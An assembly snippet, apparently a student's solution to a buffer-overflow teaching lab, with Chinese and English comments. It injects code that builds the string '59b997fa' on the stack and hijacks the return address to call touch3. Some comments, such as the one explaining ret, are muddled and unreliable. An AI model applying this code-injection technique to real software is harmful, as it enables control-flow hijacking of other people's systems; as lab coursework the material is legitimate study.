# call完getbuf后，ret是改变%rip与%rsp，pop %rip% == movq %rsp,%rip,%rsp + 2
# leaq   48(%rsp),%rsi  # let rdi to address which for "59b997fa" str make
# 所以第二次call完getbuf后，让rip回答getbuf的栈空间，将输入的字符串以指令执行

movq   %rsp,%rsi            # 当前%rsp就是指向test的栈空间了，注意
movl   $0x39623935,(%rsi)   # ascii of "59b9"，注意高位放高位
movl   $0x61663739,4(%rsi)  # ascii of "97fa"
movb   $0x00,8(%rsi)        # ascii of "\0"
movq   %rsi,%rdi      # make %rdi as argument for touch3(str)
pushq  $0x4018fa      # make touch() be the return address
ret
